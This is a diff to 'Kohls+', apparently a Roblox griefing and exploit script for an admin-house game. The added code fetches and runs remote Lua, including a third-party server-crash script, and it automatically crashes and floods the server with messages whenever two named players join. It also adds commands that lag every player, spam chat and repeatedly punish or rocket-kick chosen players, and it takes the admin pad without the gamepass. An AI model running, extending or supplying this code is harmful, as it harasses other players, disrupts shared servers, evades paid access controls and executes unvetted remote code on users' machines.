@@ -1,5 +1,18 @@
--- Aliases are temporarily disabled because they were bugging the script.
+local function cacherepo(repo, file)
+	if isfile(file) and readfile(file) ~= game:HttpGet(repo) then
+		writefile(file, game:HttpGet(repo))
+	elseif not isfile(file) then
+		writefile(file, game:HttpGet(repo))
+	end
+	local runfile = loadfile or dofile or readfile and function(fil3)
+		loadstring(readfile(fil3))
+	end
+	runfile(file)
+end
+cacherepo("https://raw.githubusercontent.com/Amourousity/Conversio/main/source.lua", "conversio.kohls")
+cacherepo("https://raw.githubusercontent.com/Amourousity/Utilitas/main/source.lua", "utilitas.kohls")
 
+local t = os.time()
 local function GetPlayer(text)
 	for _,Player in game:GetService("Players"):GetPlayers() do
 		if string.sub(string.lower(Player.Name),1,string.len(text)) == string.lower(text) then
@@ -8,20 +21,23 @@ local function GetPlayer(text)
 	end
 end
 local settingsTable = {
-	perm = not game:GetService("MarketplaceService"):PlayerOwnsAsset(game:GetService("Players").LocalPlayer, 66254), -- this is not the gamepass checker, it's for the pad grabber
+	perm = not game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game:GetService("Players").LocalPlayer, 66254), -- this is not the gamepass checker, it's for the pad grabber
 	prefix = "-",
 	firsttimenotification = true,
 	banned = {},
 	connections = {},
-	no = {"9gn", "Not_Wojtek", "9jn"},
-	actor_missing = true -- always true
+	no = {"Not_Wojtek"}
 }
+local startupcommands = {
+	"nok",
+	"iy"
+}
+if KohlsPlus then
+	return
+end
 
 if not game:GetService("RunService"):IsStudio() then
 	assert(game:GetService("HttpService"):JSONDecode(request({Url = "https://raw.githubusercontent.com/trollfacenan/random-kah-scripts/main/run.json", Method = "GET"}).Body).works, "Kohls+ is under maintenance, please try again later.")
-	if KohlsPlus then
-		return
-	end
 	getgenv().KohlsPlus = true
 	getgenv().syn = nil
 end
@@ -30,11 +46,11 @@ local function run(message)
 	game:GetService("Players"):Chat(message)
 end
 
-pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/trollfacenan/random-kah-scripts/main/AntiFling.lua"))() end)
+task.defer(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/trollfacenan/random-kah-scripts/main/AntiFling.lua"))() end)
 
 local firetouchinterestc = function(part, touchedby, idk)
 	if not identifyexecutor():find("Solara") then
-		firetouchtransmitter(part, touchedby, idk)
+		firetouchinterest(part, touchedby, idk)
 		return
 	end
 	assert(part, "firetouchinterest: Missing argument #1 (part to touch)")
@@ -44,7 +60,7 @@ local firetouchinterestc = function(part, touchedby, idk)
 	--assert(idk, "firetouchinterest: Missing argument #3 (integer)")
 	assert(part:IsA("BasePart") or part:IsA("TouchTransmitter"), "firetouchinterest: Argument #1 must be a BasePart or a TouchTransmitter!")
 	if part:IsA("BasePart") then
-		assert(part:FindFirstChildOfClass("TouchTransmitter"), "firetouchinterest: BasePart must have a TouchTransmitter")
+		assert(part:FindFirstChildOfClass("TouchTransmitter"), `firetouchinterest: BasePart must have a TouchTransmitter (Bad part: {part}, toucher: {touchedby})`)
 	end
 	local fakeclone
 	if part:IsA("BasePart") then
@@ -104,9 +120,21 @@ local firetouchinterestc = function(part, touchedby, idk)
 	end
 end
 
+local isFluxus = identifyexecutor():find("Fluxus")
 local recursive_loop
 local running = false
 recursive_loop = function(func, ...)
+	if isFluxus then
+		return task.defer(function(...)
+			while true do
+				if ... then
+					func(...) else
+					func()
+				end
+				task.wait()
+			end
+		end)
+	end
 	if running then task.desynchronize()
 		task.defer(recursive_loop, func, ...)
 		task.synchronize()
@@ -114,6 +142,17 @@ recursive_loop = function(func, ...)
 end
 local recursive_loop1
 recursive_loop1 = function(func, ...)
+	if isFluxus then
+		return task.defer(function(...)
+			while true do
+				if ... then
+					func(...) else
+					func()
+				end
+				task.wait()
+			end
+		end)
+	end
 	task.desynchronize()
 	task.defer(recursive_loop1, func, ...)
 	task.synchronize()
@@ -224,7 +263,7 @@ commands = {
 		desc = "Opposite of "..settingsTable.prefix.."ban"
 	},
 	["kick"] = {
-		name = "kick",
+		name = "lock",
 		action = function(who : string)
 			if not who then
 				game:GetService("StarterGui"):SetCore("SendNotification", {
@@ -236,35 +275,31 @@ commands = {
 			if GetPlayer(who) ~= game:GetService("Players").LocalPlayer then
 				local plr = GetPlayer(who)
 				local name = plr.Name
-				run("pm "..who.." You have been kicked via Kohls+")
+				run("pm "..who.." You have been locked from this server\nPlease join another server")
 				settingsTable.connections["Kick"..name] = plr.CharacterAdded:Connect(function()
 					settingsTable.connections["_Kick"..name]:Disconnect()
 					repeat
 						run("punish "..name)
-						run("explode "..name)
-						run("name "..name.." Dangerous creature")
+						run("blind "..name)
 						task.wait()
 					until game:GetService("Lighting"):FindFirstChild(plr.Name)
 					settingsTable.connections["_Kick"..name] = plr.Character.AncestryChanged:Connect(function(newparent)
-						if newparent ~= game:GetService("Lighting") then repeat
+						if newparent ~= game:GetService("Lighting") or newparent ~= nil then repeat
 								run("punish "..name)
-								run("explode "..name)
-								run("name "..name.." Dangerous creature")
+								run("blind "..name)
 								task.wait()
-							until game:GetService("Lighting"):FindFirstChild(plr.Name) end
+							until not plr or game:GetService("Lighting"):FindFirstChild(plr.Name) end
 					end)
 				end)
 				settingsTable.connections["_Kick"..name] = plr.Character.AncestryChanged:Connect(function(newparent)
-					if newparent ~= game:GetService("Lighting") then repeat
-						run("punish "..name)
-						run("explode "..name)
-						run("name "..name.." Dangerous creature")
-						task.wait()
-					until game:GetService("Lighting"):FindFirstChild(plr.Name) end
+					if newparent ~= game:GetService("Lighting") or newparent ~= nil then repeat
+							run("punish "..name)
+							run("blind "..name)
+							task.wait()
+						until not plr or game:GetService("Lighting"):FindFirstChild(plr.Name) end
 				end)
 				run("punish "..name)
-				run("explode "..name)
-				run("name "..name.." Dangerous creature")
+				run("blind "..name)
 				task.defer(function()
 					while task.wait() do -- cba to use .PlayerRemoving
 						if not game:GetService("Players"):FindFirstChild(name) then
@@ -309,7 +344,7 @@ commands = {
 				return "Failed"
 			end
 			local servers = {}
-			local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", PlaceId)})
+			local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", game.PlaceId)})
 			local body = game:GetService("HttpService"):JSONDecode(req.Body)
 
 			if body and body.data then
@@ -335,7 +370,7 @@ commands = {
 	["perm"] = {
 		name = "perm",
 		action = function()
-			if game:GetService("MarketplaceService"):PlayerOwnsAsset(game:GetService("Players").LocalPlayer, 66254) then
+			if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game:GetService("Players").LocalPlayer, 66254) then
 				return game:GetService("StarterGui"):SetCore("SendNotification", {
 					Title = "You already have Perm",
 					Text = "Can't disable Perm because you own the gamepass."
@@ -358,10 +393,11 @@ commands = {
 				run("gear me 94794847")
 				repeat task.wait() until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
 				game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("VampireVanquisher").Parent = game:GetService("Players").LocalPlayer.Character
-				for i = 1, 3 do
-					run("unsize me me me")
-					task.wait()
-				end
+				task.defer(function()
+					while task.wait() do
+						run("unsize me me me")
+					end
+				end)
 				if game:GetService("Players").LocalPlayer.Character:FindFirstChild("VampireVanquisher") then
 					game:GetService("StarterGui"):SetCore("SendNotification", {
 						Title = "Success",
@@ -407,11 +443,11 @@ commands = {
 			task.wait()
 			game:GetService("Players").LocalPlayer.Character:PivotTo(GetPlayer(target).Character:GetPivot())
 			task.wait(.3)
-			task.defer(function()
+			task.spawn(function()
 				for _, v in game:GetService("Players").LocalPlayer:FindFirstChildOfClass("Backpack"):GetChildren() do
 					if v.Name == "BitePlant" then v.Parent = game:GetService("Players").LocalPlayer.Character
-					task.wait(0)
-					v:Activate() end
+						task.wait(0)
+						v:Activate() end
 				end 
 			end)
 			run("punish me")
@@ -419,7 +455,7 @@ commands = {
 			run("unpunish me")
 			kicked = true
 		end,
-		desc = "Another way of kicking, you need to spam \"gear me 1645056094\""
+		desc = "A bad way of kicking, you need to spam \"gear me 1645056094\""
 	},
 	["nok"] = {
 		name = "nok",
@@ -433,33 +469,6 @@ commands = {
 		desc = "Makes you immune to obby killbricks. *Stays until you rejoin*",
 		aliases = {"noobbykill"}
 	},
-	["pmkick"] = {
-		name = "pmkick",
-		action = function(target: string)
-			if not target or not GetPlayer(target) then
-				game:GetService("StarterGui"):SetCore("SendNotification", {
-					Title = "Error",
-					Text = "Please specify a player"
-				})
-				return
-			end
-			if GetPlayer(target) == game:GetService("Players").LocalPlayer then
-				game:GetService("StarterGui"):SetCore("SendNotification", {
-					Title = "Error",
-					Text = "Cannot kick yourself"
-				})
-				return
-			end
-			running = true
-			task.defer(function() repeat task.wait() until not GetPlayer(target) running = false end)
-			local player = GetPlayer(target).Name
-			-- This message is logged from SCV3-Var so credits to Tech (SCV3-Var developer)
-			recursive_loop(function()
-				run("pm "..player.." "..shared.pmstuff)
-			end)
-		end,
-		desc = "Crashes the player via private messages."
-	},
 	["antifling"] = {
 		name = "antifling",
 		action = function()
@@ -467,20 +476,21 @@ commands = {
 		end,
 		desc = "Prevents you from being flinged. (Use this command to toggle Anti-fling)"
 	},
-	["antipmkick"] = {
-		name = "antipmkick",
-		action = function()
-			antipmkickv = not antipmkickv
-		end,
-		desc = "Prevents you from being crashed via pmkick (Use this command to toggle Anti PM-Kick)"
-	},
 	["punish2"] = {
 		name = "punish2",
 		action = function(target: string)
-			run("gear me 139578207")
+			run("respawn "..target)
+			task.wait()
+			for i = 1, 20 do
+				run("gear me 139578207")
+			end
 			repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("TriLaserGun")
 			task.wait()
-			game.Players.LocalPlayer.Backpack:FindFirstChild("TriLaserGun").Parent = game.Players.LocalPlayer.Character
+			for i, v in game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
+				if v.Name == "TriLaserGun" then
+					v.Parent = game:GetService("Players").LocalPlayer.Character
+				end
+			end
 			local removed = false
 			local kahcon
 			local kahcon2
@@ -513,11 +523,11 @@ commands = {
 				end
 			end)
 			game.Players.LocalPlayer.Character.TriLaserGun.Click:FireServer(TargetPlayer.Character.HumanoidRootPart.Position)
-			repeat task.wait() until removed
+			task.defer(function() repeat task.wait() until removed
 
 
 			kahcon:Disconnect()
-			kahcon2:Disconnect()
+			kahcon2:Disconnect() end)
 		end,
 		desc = "Alternate punish. Makes the player unable to respawn. Sometimes fails"
 	},
@@ -528,7 +538,7 @@ commands = {
 			spamming = ""
 			fastspamming = ""
 		end,
-		desc = "Stops spamming commands (exclusions: kick, ban)"
+		desc = "Stops spamming commands"
 	},
 	["spam"] = {
 		name = "spam",
@@ -571,6 +581,95 @@ commands = {
 			settingsTable.prefix = command
 		end,
 		desc = "Changes your command prefix."
+	},
+	["rkick"] = {
+		name = "rkick",
+		action = function(user: string)
+			if not game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game:GetService("Players").LocalPlayer.UserId, 35748) then
+				game:GetService("StarterGui"):SetCore("SendNotification", {
+					Title = "Error",
+					Text = "P299 admin not found. This command is unavailable for you."
+				})
+				return
+			end
+			if not user or not GetPlayer(user) then
+				game:GetService("StarterGui"):SetCore("SendNotification", {
+					Title = "Error",
+					Text = "No player/invalid player specified."
+				})
+				return
+			end
+			local u = GetPlayer(user)
+			run("respawn "..u.Name)
+			run("setgrav "..u.Name.. " 3500")
+			run("jail/".. u.Name)
+			task.spawn(function()
+				while spamming and u ~= nil do
+					game.Players.LocalPlayer.Character:PivotTo(u.Character:GetPivot() * CFrame.Angles(0,math.rad(180),0)*CFrame.new(0,0,-2))
+					run("rocket/all/all/all")
+					task.wait()
+				end
+			end)
+		end,
+		desc = "Kicks someone using rockets. P299 required"
+	},
+	["lagall"] = {
+		name = "templagall",
+		action = function()
+			if #game:GetService("Players"):GetPlayers() < 4 then
+				return game:GetService("StarterGui"):SetCore("SendNotification", {
+					Title = "Error",
+					Text = "Insufficient amount of players (min. 4)"
+				})
+			end
+			task.spawn(function()
+				running = true
+				while true do
+					run("respawn all all all")
+					task.wait()
+				end
+			end)
+			task.wait(10)
+			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
+		end,
+		desc = "Temporarily lags everyone via spamming respawn. Rejoins after 10 seconds."
+	},
+	["lagall2"] = {
+		name = "lagall",
+		action = function()
+			if #game:GetService("Players"):GetPlayers() < 4 then
+				return game:GetService("StarterGui"):SetCore("SendNotification", {
+					Title = "Error",
+					Text = "Insufficient amount of players (min. 4)"
+				})
+			end
+			task.spawn(function()
+				running = true
+				while true do
+					run("respawn all all all")
+					if not running then break end
+					task.wait()
+				end
+			end)
+		end,
+		desc = "Lags everyone via spamming respawn. Use -stop to stop."
+	},
+	["aa"] = {
+		name = "iy",
+		action = function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+		end,
+		desc = "Loads Infinite Yield"
+	},
+	["chatspam"] = {
+		name = "chatspam",
+		action = function()
+			while running do
+				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(randomString(), "All")
+				task.wait(1)
+			end	
+		end,
+		desc = "Spams random strings in the chat"
 	}
 }
 game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
@@ -579,15 +678,20 @@ game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
 		if msg:find(settingsTable.prefix..v.name) and user[2] and msg:match(settingsTable.prefix.."fastspam") then
 			fastspamming = msg:sub(11)
 		elseif msg:find(settingsTable.prefix..v.name) and user[2] and msg:match(settingsTable.prefix.."spam") then
-			fastspamming = msg:sub(7)
-		elseif msg:find(settingsTable.prefix..v.name) and user[2] then
+			spamming = msg:sub(7)
+		elseif msg:match(settingsTable.prefix..v.name) and user[2] then
 			v.action(user[2])
-		elseif msg:find(settingsTable.prefix..v.name) and not user[2] then
+		elseif msg:match(settingsTable.prefix..v.name) and not user[2] then
 			v.action()
 		end
 	end
 end)
+for i, v in startupcommands do
+	run(settingsTable.prefix..v)
+end
 local function antirkick(character)
+	task.wait(.2)
+	repeat task.wait() until #character:GetChildren() > 0
 	character.ChildAdded:Connect(function(rocket)
 		if rocket.Name == "Rocket" then
 			task.wait(.3)
@@ -596,10 +700,51 @@ local function antirkick(character)
 	end)
 end
 for i, v in game:FindService("Players"):GetPlayers() do
+	if v.Name == "9jn" or v.Name == "9gn" then
+		run("blind all fuck")
+		run("ungear all all all fuck")
+		run("punish all fuck")
+		run("trip others fuck")
+		run("setgrav others -inf")
+		run("unpunish me fuck")
+		run("unpunish me fuck")
+		for i = 1, 50 do
+			run("h/THIS SERVER WAS CRASHED BECAUSE OF A BAD PERSON")
+			run("m/THIS SERVER WAS CRASHED BECAUSE OF A BAD PERSON")
+			run("h THIS SERVER WAS CRASHED BECAUSE OF A BAD PERSON")
+			run("m THIS SERVER WAS CRASHED BECAUSE OF A BAD PERSON")
+			run("pm all THIS SERVER WAS CRASHED BECAUSE OF A BAD PERSON")
+		end
+		task.wait(.5)
+		pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/scv3-var's%20usilcrash"))()
+		end)
+	end
 	antirkick(v.Character)
 	v.CharacterAdded:Connect(antirkick)
 end
 game:GetService("Players").PlayerAdded:Connect(function(v)
+	if v.Name == "9jn" or v.Name == "9gn" then
+		run("blind all fuck")
+		run("ungear all all all fuck")
+		run("punish all fuck")
+		run("trip others fuck")
+		run("setgrav others -inf")
+		run("unpunish me fuck")
+		run("unpunish me fuck")
+		for i = 1, 50 do
+			run("h/THIS SERVER WAS CRASHED BECAUSE OF A BAD PERSON")
+			run("m/THIS SERVER WAS CRASHED BECAUSE OF A BAD PERSON")
+			run("h THIS SERVER WAS CRASHED BECAUSE OF A BAD PERSON")
+			run("m THIS SERVER WAS CRASHED BECAUSE OF A BAD PERSON")
+			run("pm all THIS SERVER WAS CRASHED BECAUSE OF A BAD PERSON")
+		end
+		task.wait(.5)
+		local s, e = pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/scv3-var's%20usilcrash"))()
+		end)
+		if e then run("-shutdown dog") end
+	end
 	antirkick(v.Character)
 	v.CharacterAdded:Connect(antirkick)
 end)
@@ -608,47 +753,54 @@ local assets = workspace:FindFirstChildOfClass("Terrain"):WaitForChild("_Game")
 local pads = assets:WaitForChild("Admin"):WaitForChild("Pads")
 
 game:GetService("RunService").Heartbeat:Connect(function(dt)
-	for i, v in game:GetService("Players"):GetPlayers() do
-		if settingsTable.banned[v.UserId] or settingsTable.no[v.Name] and v.Character.Parent and v.Character.Parent ~= workspace then
-			local name = v.Name
-			run("explode "..name)
-			run("punish "..name)
-			run("name "..name.." Dangerous creature")
-		end
-		if v.Character:FindFirstChild("VampireVanquisher") or v.Backpack:FindFirstChild("VampireVanquisher") then
+	for i, v in game:FindService("Players"):GetPlayers() do
+		if (game:GetService("Players").LocalPlayer.Name ~= v.Name) and v.Character and v.Character:FindFirstChild("VampireVanquisher") or v.Backpack:FindFirstChild("VampireVanquisher") then
 			local name = v.Name
 			run("ungear "..name)
 			run("pm "..name.." This gear is not allowed!")
 		end
 		if v.Character:FindFirstChild("Rocket") then
 			task.defer(function() task.wait(.2)
-			v.Character.Rocket:Destroy() end)
+				v.Character.Rocket:Destroy() end)
 		end
 	end
 	if game:FindService("Players").LocalPlayer.PlayerGui:FindFirstChild("EFFECTGUIBLIND") then
 		game:FindService("Players").LocalPlayer.PlayerGui:FindFirstChild("EFFECTGUIBLIND"):Destroy()
 	end
 end)
+game:GetService("Players").PlayerAdded:Connect(function(v)
+	if settingsTable.banned[v.UserId] or settingsTable.no[v.Name] and v.Character.Parent and v.Character.Parent == workspace then
+		local name = v.Name
+		run("punish "..name)
+		run("blind "..name)
+	end
+end)
+for i, v in game:GetService("Players"):GetPlayers() do
+	if settingsTable.banned[v.UserId] or settingsTable.no[v.Name] and v.Character.Parent and v.Character.Parent == workspace then
+		local name = v.Name
+		run("punish "..name)
+		run("blind "..name)
+	end
+end
+
 game:GetService("RunService").Heartbeat:Connect(function(dt)
 	if settingsTable.perm then
 		if not pads:FindFirstChild(game.Players.LocalPlayer.Name.."'s admin") and pads:FindFirstChild("Touch to get admin") then
 			pcall(function()
-				firetouchinterestc(pads:FindFirstChild("Touch to get admin").Head, game.Players.LocalPlayer.Character.Torso, 1337)
+				firetouchinterestc(pads:FindFirstChild("Touch to get admin").Head, game.Players.LocalPlayer.Character.Torso, 0)
+				firetouchinterestc(pads:FindFirstChild("Touch to get admin").Head, game.Players.LocalPlayer.Character.Torso, 1)
 			end)
 		end
 	end
 end)
+
 game:GetService("StarterGui"):SetCore("SendNotification", {
 	Title = "Welcome to Kohls+",
 	Text = "Script loaded successfully"
 })
-game:GetService("StarterGui"):SetCore("SendNotification", {
-	Title = "Aliases disabled",
-	Text = "Aliases are temporarily disabled because they were broken."
-})
 
 -- Other Loops
-spawn(function()
+task.defer(function()
 	recursive_loop1(function()
 		if fastspamming ~= "" then
 			run(fastspamming)
